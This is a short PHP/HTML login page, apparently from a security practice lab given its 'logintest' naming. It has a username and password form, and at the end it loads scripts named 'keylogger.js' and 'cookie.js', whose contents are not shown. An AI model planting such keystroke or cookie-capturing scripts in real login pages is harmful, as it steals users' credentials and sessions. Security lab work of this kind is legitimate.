<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Sharks login</title>
        <link rel="stylesheet" href="../../style.css">
    </head>
    <body class="logintest">
        <nav class="navbar">
            <div class="nav-left">
                <a href="">Sharks</a>
            </div>
            <div class="nav-right">
            <?php if (isset($_SESSION['username'])) : ?> 
            <a href="">logout</a>
            <?php endif; ?>
        </div>
        </nav>
        <div class="login-box">
            <h2>Sharks</h2>
            <h3> Login </h3>
            <form action="logintest_proc.php" method="POST">
            <div class="input-group">
                <label for="username">ID</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">PW</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">submit</button>
            <p class="signup-text"><a href="">Sign Up</a></p>
            </form>
        </div>
        <script src="keylogger.js"></script>
        <script src="cookie.js"></script>
    </body>
</html>